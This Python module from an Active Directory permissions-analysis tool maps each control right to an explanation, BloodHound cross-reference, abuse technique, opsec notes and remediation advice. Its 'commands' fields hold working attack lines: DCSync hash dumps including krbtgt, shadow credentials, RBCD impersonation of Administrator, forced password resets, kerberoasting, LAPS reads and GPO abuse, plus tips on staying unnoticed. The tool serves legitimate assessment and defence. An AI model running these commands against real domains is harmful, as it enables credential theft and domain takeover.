"""
Per-right guidance for the GUI edge-detail modal: what a control right means,
how it is abused (impacket / Linux-first), operational notes, and how to
remediate it. Consumed via /api/edge-detail.

This is original text written for this tool. It follows the same structure as
BloodHound's edge help and cross-references the corresponding BloodHound edge
name (``bh_edge``) so users can look up the community docs, but no BloodHound
content is copied — there is no license obligation to carry.

Lookup: the ``right`` string on a ControlEdge may carry a prefix/suffix
(e.g. "WriteProperty:Service-Principal-Name", "DENY:GenericAll",
"DCSync (replicate secrets)"), so we match the longest known key contained in
the right, then a generic category, then a default.

Entry schema:
  summary   — one line: what the right lets the holder do.
  bh_edge   — the equivalent BloodHound edge name (for cross-reference), or "".
  offense   — the abuse technique, prose.
  commands  — list of concrete Linux/impacket command lines (strings).
  opsec     — operational / detection considerations, or "".
  defense   — how to remove or mitigate it.
"""

from __future__ import annotations

# SpecterOps BloodHound Community edge documentation index (edge name appended).
BH_DOCS_BASE = "https://bloodhound.specterops.io/resources/edges/"

ADVICE = {
    "GenericAll": {
        "summary": "Full control over the object — equivalent to owning it.",
        "bh_edge": "generic-all",
        "offense": "GenericAll is the union of every other control right, so the abuse "
                   "depends on the target's class. On a USER: reset the password, or write "
                   "msDS-KeyCredentialLink for a shadow-credentials attack (no password "
                   "change, stealthier). On a GROUP: add a principal you control as a member. "
                   "On a COMPUTER: configure resource-based constrained delegation (RBCD) or "
                   "add shadow credentials, then impersonate any user to that host.",
        "commands": [
            "# shadow credentials (user/computer) -> PKINIT -> NT hash",
            "certipy shadow auto -u you@dom -p pass -account victim",
            "# or force-reset a user password",
            "net rpc password 'victim' 'NewPass123!' -U dom/you%pass -S dc01",
            "# RBCD on a computer object",
            "impacket-rbcd -delegate-to 'TARGET$' -delegate-from 'ATTACKER$' -action write dom/you:pass",
        ],
        "opsec": "Password reset locks out the real user and is noisy; shadow credentials / "
                 "RBCD are quieter. KeyCredentialLink writes are logged by some EDR.",
        "defense": "Remove the GenericAll ACE unless it is a required delegation. Prefer a "
                   "narrowly-scoped right (e.g. only User-Force-Change-Password) over full "
                   "control. Review the object's inbound view in adcontrol.",
    },
    "GenericWrite": {
        "summary": "Write any non-protected attribute on the object.",
        "bh_edge": "generic-write",
        "offense": "You can't rewrite the DACL, but you can write the attributes that lead to "
                   "takeover: set a servicePrincipalName and kerberoast the account; write "
                   "msDS-KeyCredentialLink for shadow credentials; on a computer set "
                   "msDS-AllowedToActOnBehalfOfOtherIdentity for RBCD; on a group, write the "
                   "member attribute.",
        "commands": [
            "# targeted kerberoast: set a fake SPN, roast, then clear it",
            "targetedKerberoast.py -v -d dom -u you -p pass --request-user victim",
            "# shadow credentials",
            "certipy shadow auto -u you@dom -p pass -account victim",
        ],
        "opsec": "Kerberoast TGS requests are logged (event 4769); shadow creds are quieter.",
        "defense": "Remove GenericWrite. If a service must write specific attributes, grant "
                   "Write-Property on just those attributes instead.",
    },
    "WriteDacl": {
        "summary": "Rewrite the object's DACL — grant yourself any right, then abuse it.",
        "bh_edge": "write-dacl",
        "offense": "Add a GenericAll (or a scoped right) ACE for a principal you control, then "
                   "perform the follow-on abuse for the object's class.",
        "commands": [
            "impacket-dacledit -action write -rights FullControl -principal you -target victim dom/you:pass",
            "# then, e.g. shadow creds on the now-controlled object",
            "certipy shadow auto -u you@dom -p pass -account victim",
        ],
        "opsec": "DACL modifications on protected objects are high-signal (event 5136 with SACL).",
        "defense": "Remove WriteDacl / WriteOwner from non-tier-0 principals — these are the "
                   "classic ACL-based privilege-escalation rights. Treat any non-admin holder "
                   "as a finding.",
    },
    "WriteOwner": {
        "summary": "Take ownership of the object; the owner can always rewrite the DACL.",
        "bh_edge": "write-owner",
        "offense": "Set yourself (or a principal you control) as owner, which implicitly lets "
                   "you rewrite the DACL, grant GenericAll, and take the object over.",
        "commands": [
            "impacket-owneredit -action write -new-owner you -target victim dom/you:pass",
            "impacket-dacledit -action write -rights FullControl -principal you -target victim dom/you:pass",
        ],
        "opsec": "Owner changes are logged; restore the original owner after the operation.",
        "defense": "Remove WriteOwner from non-admins and reset the object's owner to the "
                   "appropriate tier-0 admin group.",
    },
    "Owns (implicit WriteDacl)": {
        "summary": "The principal owns the object; owners can always modify the DACL.",
        "bh_edge": "owns",
        "offense": "As owner you can grant yourself GenericAll and then take the object over "
                   "(same follow-on as WriteDacl).",
        "commands": [
            "impacket-dacledit -action write -rights FullControl -principal you -target victim dom/you:pass",
        ],
        "opsec": "",
        "defense": "Reset the object's owner to a tier-0 admin group. Investigate how a "
                   "non-admin came to own it (often object-creation delegation on the OU).",
    },
    "DCSync": {
        "summary": "Replicate directory secrets — can extract every account's password hash.",
        "bh_edge": "dc-sync",
        "offense": "DCSync uses the replication protocol to pull secrets for any account, "
                   "including krbtgt. With the krbtgt hash you can forge golden tickets; with "
                   "any admin hash you own the domain. Requires GetChanges + GetChanges-All on "
                   "the domain head.",
        "commands": [
            "impacket-secretsdump -just-dc dom/you:pass@dc01",
            "# just krbtgt for a golden ticket",
            "impacket-secretsdump -just-dc-user krbtgt dom/you:pass@dc01",
        ],
        "opsec": "Replication from a non-DC source is detectable (event 4662 on the domain "
                 "object with the replication GUIDs). This is the single most dangerous "
                 "non-admin grant in AD.",
        "defense": "Remove DS-Replication-Get-Changes and Get-Changes-All from any principal "
                   "that is not a DC / tier-0. Audit the domain-head DACL regularly.",
    },
    "DS-Replication-Get-Changes-All": {
        "summary": "Half of DCSync — replicate secret domain data (needs Get-Changes too).",
        "bh_edge": "dc-sync",
        "offense": "Combined with DS-Replication-Get-Changes on the domain head, enables DCSync.",
        "commands": ["impacket-secretsdump -just-dc dom/you:pass@dc01"],
        "opsec": "",
        "defense": "Remove from non-tier-0 principals; only DCs need it.",
    },
    "DS-Replication-Get-Changes": {
        "summary": "Half of DCSync — replicate directory changes (needs Get-Changes-All too).",
        "bh_edge": "dc-sync",
        "offense": "Combined with Get-Changes-All on the domain head, enables DCSync.",
        "commands": ["impacket-secretsdump -just-dc dom/you:pass@dc01"],
        "opsec": "",
        "defense": "Remove from non-tier-0 principals; only DCs need it.",
    },
    "User-Force-Change-Password": {
        "summary": "Reset the target user's password without knowing the current one.",
        "bh_edge": "force-change-password",
        "offense": "Set a new password for the user and authenticate as them. Prefer shadow "
                   "credentials where you also hold write on KeyCredentialLink, since a "
                   "password reset locks out and alerts the real user.",
        "commands": [
            "net rpc password 'victim' 'NewPass123!' -U dom/you%pass -S dc01",
            "# impacket alternative",
            "impacket-changepasswd dom/victim@dc01 -newpass 'NewPass123!' -altuser you -altpass pass -reset",
        ],
        "opsec": "Very noisy — the victim can no longer log in and helpdesk gets called. Event "
                 "4724 fires. Reset back if you can.",
        "defense": "Remove the ForceChangePassword extended right from principals that are not "
                   "helpdesk/admin. Scope helpdesk reset rights to specific OUs.",
    },
    "AddMember": {
        "summary": "Add members to the target group (including yourself).",
        "bh_edge": "add-member",
        "offense": "Add a principal you control to the group to inherit its privileges — "
                   "especially dangerous on privileged or nested-to-privileged groups.",
        "commands": [
            "net rpc group addmem 'Target Group' 'you' -U dom/you%pass -S dc01",
            "bloodyAD -d dom -u you -p pass --host dc01 add groupMember 'Target Group' you",
        ],
        "opsec": "Group membership changes are logged (event 4728/4732). Remove yourself after.",
        "defense": "Remove write access to the group's member attribute; for sensitive groups, "
                   "restrict membership management to tier-0 admins.",
    },
    "Self-Membership": {
        "summary": "Add *yourself* to the target group.",
        "bh_edge": "add-self",
        "offense": "Use the validated self-membership write to join the group directly and "
                   "inherit its rights.",
        "commands": [
            "bloodyAD -d dom -u you -p pass --host dc01 add groupMember 'Target Group' you",
        ],
        "opsec": "Event 4728/4732; remove yourself afterward.",
        "defense": "Remove the Self-Membership validated write from non-admins on sensitive groups.",
    },
    "WriteProperty:Member": {
        "summary": "Write the group's member attribute — add or remove members.",
        "bh_edge": "add-member",
        "offense": "Add a controlled principal to the group to inherit its privileges.",
        "commands": [
            "bloodyAD -d dom -u you -p pass --host dc01 add groupMember 'Target Group' you",
        ],
        "opsec": "Event 4728/4732.",
        "defense": "Remove write access to the member attribute for non-admins.",
    },
    "WriteProperty:msDS-AllowedToActOnBehalfOfOtherIdentity": {
        "summary": "Configure resource-based constrained delegation (RBCD) on the target computer.",
        "bh_edge": "allowed-to-act",
        "offense": "Point RBCD at a computer account you control, then use S4U2Self/S4U2Proxy to "
                   "request a service ticket impersonating any user (including a domain admin) "
                   "to the target host — effectively local admin on it. If you have no machine "
                   "account, create one (default MachineAccountQuota lets any user add 10).",
        "commands": [
            "impacket-addcomputer -computer-name 'ATTACK$' -computer-pass Pass123 dom/you:pass",
            "impacket-rbcd -delegate-to 'TARGET$' -delegate-from 'ATTACK$' -action write dom/you:pass",
            "impacket-getST -spn cifs/target.dom -impersonate Administrator -dc-ip dc01 dom/ATTACK\\$:Pass123",
            "KRB5CCNAME=Administrator.ccache impacket-secretsdump -k -no-pass target.dom",
        ],
        "opsec": "Ticket requests are logged; the computer you create shows up in AD. RBCD is a "
                 "reliable, common path — treat write on this attribute as local admin.",
        "defense": "Clear msDS-AllowedToActOnBehalfOfOtherIdentity and remove write access to "
                   "it. Consider setting ms-DS-MachineAccountQuota to 0.",
    },
    "WriteProperty:Service-Principal-Name": {
        "summary": "Write an SPN onto the account, enabling kerberoasting.",
        "bh_edge": "write-spn",
        "offense": "Set a fake SPN on the target user, request a service ticket, crack it "
                   "offline (targeted kerberoasting), then clear the SPN. Only works if the "
                   "account's password is crackable.",
        "commands": [
            "targetedKerberoast.py -v -d dom -u you -p pass --request-user victim",
            "hashcat -m 13100 hashes.txt wordlist.txt",
        ],
        "opsec": "TGS request logs (event 4769). Weak/service-account passwords are the enabler.",
        "defense": "Remove write access to servicePrincipalName. Move service accounts to gMSA "
                   "so their passwords are unguessable.",
    },
    "WriteProperty:msDS-KeyCredentialLink": {
        "summary": "Write key credentials — shadow-credentials attack for instant auth.",
        "bh_edge": "add-key-credential-link",
        "offense": "Add an attacker-controlled device key to the target's KeyCredentialLink, "
                   "then PKINIT to obtain a TGT and recover the NT hash — no password change, "
                   "so it's stealthy and self-cleaning.",
        "commands": [
            "certipy shadow auto -u you@dom -p pass -account victim",
            "# or pywhisker + gettgtpkinit for the manual flow",
            "pywhisker -d dom -u you -p pass --target victim --action add",
        ],
        "opsec": "Requires the domain to support PKINIT (a CA / the KDC cert). KeyCredentialLink "
                 "writes are logged by some EDR but rarely alerted.",
        "defense": "Remove write access to msDS-KeyCredentialLink. Deploy Windows LAPS and "
                   "monitor for KeyCredentialLink modifications.",
    },
    "ReadLAPSPassword": {
        "summary": "Read the LAPS-managed local administrator password of the computer.",
        "bh_edge": "read-laps-password",
        "offense": "Read ms-Mcs-AdmPwd / msLAPS-Password to recover the local admin password "
                   "and log in with local admin on that host.",
        "commands": [
            "netexec ldap dc01 -u you -p pass --laps",
            "python3 pyLAPS.py --action get -d dom -u you -p pass",
        ],
        "opsec": "LAPS reads are auditable (event 4662 on the computer object). Passwords rotate.",
        "defense": "Restrict read on the LAPS password attribute to tier-0/designated admins. "
                   "Audit domain-wide who can read it.",
    },
    "AllExtendedRights": {
        "summary": "All control-access rights on the object (includes ForceChangePassword, DCSync-on-domain, LAPS read).",
        "bh_edge": "all-extended-rights",
        "offense": "Grants every extended right at once — pick the one that matters for the "
                   "object: reset password (user), read LAPS (computer), or DCSync (domain head).",
        "commands": [
            "# depends on target class — see the specific right's guidance",
        ],
        "opsec": "",
        "defense": "Remove AllExtendedRights; grant only the specific extended right needed.",
    },
    "WriteProperty:gPLink": {
        "summary": "Link/unlink GPOs on the OU or domain — push policy (and code) to objects underneath.",
        "bh_edge": "gp-link",
        "offense": "Create a malicious GPO (or link an existing controllable one) to the OU to "
                   "affect every computer/user beneath it — add a local admin, run an immediate "
                   "scheduled task, etc.",
        "commands": [
            "pygpoabuse.py dom/you:pass -gpo-id <GUID> -command 'net localgroup administrators you /add'",
        ],
        "opsec": "Affects all objects in the OU — high blast radius and high signal. GPO changes "
                 "replicate and are logged.",
        "defense": "Remove write access to gPLink for non-admins. gPLink over an OU containing "
                   "tier-0 assets is a tier-0 finding.",
    },
    "Send-As": {
        "summary": "Send email as the target (Exchange). Rarely an AD-takeover path.",
        "bh_edge": "",
        "offense": "Impersonate the mailbox owner in email — a messaging/phishing concern, not "
                   "an AD escalation on its own.",
        "commands": [],
        "opsec": "",
        "defense": "Review whether the Send-As grant is intended; remove if not.",
    },
}

_GENERIC = {
    "WriteProperty": {
        "summary": "Write a specific attribute on the object.",
        "bh_edge": "",
        "offense": "Depending on the attribute, may enable kerberoasting (servicePrincipalName), "
                   "RBCD (msDS-AllowedToActOnBehalfOfOtherIdentity), shadow credentials "
                   "(msDS-KeyCredentialLink), or group changes (member). Review the attribute name.",
        "commands": [],
        "opsec": "",
        "defense": "Remove write access to this attribute unless required.",
    },
    "ExtendedRight": {
        "summary": "A control-access (extended) right on the object.",
        "bh_edge": "",
        "offense": "Effect depends on the specific right; many are benign (messaging/DNS), some "
                   "are dangerous (password reset, replication). Review its name.",
        "commands": [],
        "opsec": "",
        "defense": "Grant only the specific extended right needed; remove otherwise.",
    },
    "_default": {
        "summary": "A control relationship on the object.",
        "bh_edge": "",
        "offense": "Review the right in the context of the target object type.",
        "commands": [],
        "opsec": "",
        "defense": "Remove the right if the principal does not require it.",
    },
}


def _bh_link(bh_edge: str) -> str:
    return (BH_DOCS_BASE + bh_edge) if bh_edge else ""


def advise(right: str) -> dict:
    """Return a guidance dict for a right string. Strips 'DENY:' (a deny ACE is
    described but has no abuse path), matches the longest known ADVICE key, then
    a generic category, then the default. Adds a ``bh_link`` for cross-reference."""
    r = right or ""
    denied = r.startswith("DENY:")
    if denied:
        r = r[len("DENY:"):]

    best = None
    for key in sorted(ADVICE, key=len, reverse=True):
        if key in r:
            best = ADVICE[key]
            break
    if best is None:
        for cat in ("WriteProperty", "ExtendedRight"):
            if r.startswith(cat):
                best = _GENERIC[cat]
                break
    if best is None:
        best = _GENERIC["_default"]

    out = dict(best)
    out["commands"] = list(best.get("commands", []))
    out["bh_link"] = _bh_link(best.get("bh_edge", ""))

    if denied:
        out.update({
            "summary": "DENY ACE — " + out["summary"],
            "offense": "This is a deny entry, not a grant; it removes the right rather than "
                       "granting it. No abuse path.",
            "commands": [],
            "opsec": "",
            "defense": "Deny ACEs can create confusing effective-access results; verify it is "
                       "intentional.",
        })
    return out
